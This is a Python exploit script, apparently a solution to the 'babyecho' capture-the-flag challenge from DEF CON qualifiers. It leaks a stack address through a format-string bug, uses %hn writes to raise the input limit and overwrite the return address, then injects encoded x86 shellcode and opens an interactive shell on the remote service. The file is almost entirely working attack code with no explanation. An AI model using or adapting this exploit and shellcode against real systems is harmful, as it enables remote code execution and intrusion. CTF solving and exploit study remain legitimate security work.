import socket
import struct

def q(a):
  return struct.pack("I", a)

def recv_until(st):
  ret = ""
  while st not in ret:
    ret += s.recv(1)
    #print ret
    #print ret.encode("hex")
  return ret

shell = "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"+ "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"+ "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"


s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
#s = socket.create_connection(("localhost", 1234))

bytes = recv_until("bytes\n")
print bytes
raw_input("press enter")

s.send("%d%d%d%d%p\n")
print "reading resp"
resp = recv_until("\n")
print resp
stack = resp[resp.find("0x"):]
print stack
stack = int(stack, 16)
print stack
resp = recv_until("\n")
tosend = q(stack-0xc) + "%m%7$hn\n"
print len(tosend)
print tosend.encode("hex")
s.send(tosend);
resp = recv_until("bytes\n")
print resp
#now we can send up to 29 bytes
tosend = q(stack-0xc) + "%m" * 9 +  "%7$hn\n"
print len(tosend)
print tosend.encode("hex")
s.send(tosend);
resp = recv_until("bytes\n")
print resp

#now we can send up to 229 bytes
tosend = q(stack-0xc) + "%m" * 44 +  "%7$hn\n"
print len(tosend)
print tosend.encode("hex")
s.send(tosend);
resp = recv_until("bytes\n")
print resp

#we have reach the maximum here
ret_off = 1040 # offset from buffer in stack to return address

retaddr = q(stack + 4) # address of shellcode
#set the return address to buffer

print "ret addr ", retaddr.encode("hex")
ctr = 0
for i in list(retaddr):
	print "sending ", ord(i)
	addr = stack + ret_off + ctr
	print "addr = %08x, stack = %08x" % (addr, stack)
	tosend = q(stack+ret_off+ctr) + "%08x%08x%08x%08x%08x%" + str(ord(i)-8*5-4) + "c%hn|\n"
	print tosend
	print tosend.encode("hex")
	s.send(tosend);
	print "waiting"
	resp = recv_until("bytes\n")
	print resp
	ctr += 1


#this will make us exit from the loop (set esp+18h to non zero)
tosend = q(stack-0xc+0x8) + shell + "%7$hn---\n"
print tosend
print tosend.encode("hex")
s.send(tosend)

#next position will be acessible from %9$
#add the shellcode
#tosend += shell

#raw_input("press enter")



import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

